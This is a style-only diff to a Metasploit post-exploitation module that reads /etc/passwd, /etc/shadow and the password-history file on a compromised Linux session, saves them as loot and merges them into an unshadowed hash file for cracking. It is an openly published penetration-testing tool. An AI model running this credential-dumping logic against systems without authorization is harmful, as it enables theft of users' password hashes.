@@ -3,21 +3,22 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'metasploit/framework/hashes'
-
 class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Linux::Priv
 
   def initialize(info = {})
-    super( update_info( info,
-      'Name'          => 'Linux Gather Dump Password Hashes for Linux Systems',
-      'Description'   => %q{ Post Module to dump the password hashes for all users on a Linux System},
-      'License'       => MSF_LICENSE,
-      'Author'        => ['Carlos Perez <carlos_perez[at]darkoperator.com>'],
-      'Platform'      => ['linux'],
-      'SessionTypes'  => ['shell', 'meterpreter']
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'Linux Gather Dump Password Hashes for Linux Systems',
+        'Description' => %q{ Post Module to dump the password hashes for all users on a Linux System},
+        'License' => MSF_LICENSE,
+        'Author' => ['Carlos Perez <carlos_perez[at]darkoperator.com>'],
+        'Platform' => ['linux'],
+        'SessionTypes' => ['shell', 'meterpreter']
+      )
+    )
   end
 
   # Run Method for when run command is issued
@@ -28,19 +29,19 @@ class MetasploitModule < Msf::Post
 
     passwd_file = read_file('/etc/passwd')
     unless passwd_file.nil?
-      p = store_loot("linux.passwd", "text/plain", session, passwd_file, "passwd.tx", "Linux Passwd File")
+      p = store_loot('linux.passwd', 'text/plain', session, passwd_file, 'passwd.tx', 'Linux Passwd File')
       vprint_good("passwd saved in: #{p}")
     end
 
     shadow_file = read_file('/etc/shadow')
     unless shadow_file.nil?
-      p = store_loot("linux.shadow", "text/plain", session, shadow_file, "shadow.tx", "Linux Password Shadow File")
+      p = store_loot('linux.shadow', 'text/plain', session, shadow_file, 'shadow.tx', 'Linux Password Shadow File')
       vprint_good("Shadow saved in: #{p}")
     end
 
     opasswd_file = read_file('/etc/security/opasswd')
     unless opasswd_file.nil?
-      p = store_loot("linux.passwd.history", "text/plain", session, opasswd_file, "opasswd.tx", "Linux Passwd History File")
+      p = store_loot('linux.passwd.history', 'text/plain', session, opasswd_file, 'opasswd.tx', 'Linux Passwd History File')
       vprint_good("opasswd saved in: #{p}")
     end
 
@@ -52,14 +53,14 @@ class MetasploitModule < Msf::Post
       hash_parts = l.split(':')
       jtr_format = Metasploit::Framework::Hashes.identify_hash hash_parts[1]
 
-      if jtr_format.empty? #overide the default
+      if jtr_format.empty? # overide the default
         jtr_format = 'des,bsdi,crypt'
       end
 
       credential_data = {
         jtr_format: jtr_format,
         origin_type: :session,
-        post_reference_name: self.refname,
+        post_reference_name: refname,
         private_type: :nonreplayable_hash,
         private_data: hash_parts[1],
         session_id: session_db_id,
@@ -71,7 +72,7 @@ class MetasploitModule < Msf::Post
     end
 
     # Save passwd file
-    upasswd = store_loot("linux.hashes", "text/plain", session, john_file, "unshadowed_passwd.pwd", "Linux Unshadowed Password File")
+    upasswd = store_loot('linux.hashes', 'text/plain', session, john_file, 'unshadowed_passwd.pwd', 'Linux Unshadowed Password File')
     print_good("Unshadowed Password File: #{upasswd}")
   end
 
@@ -86,7 +87,8 @@ class MetasploitModule < Msf::Post
       user = sl.scan(/(^\w*):/).join
       pf.each_line do |pl|
         next unless pl.match(/^#{user}:/)
-        unshadowed << pl.gsub(/:x:/,":#{pass}:")
+
+        unshadowed << pl.gsub(/:x:/, ":#{pass}:")
       end
     end
 
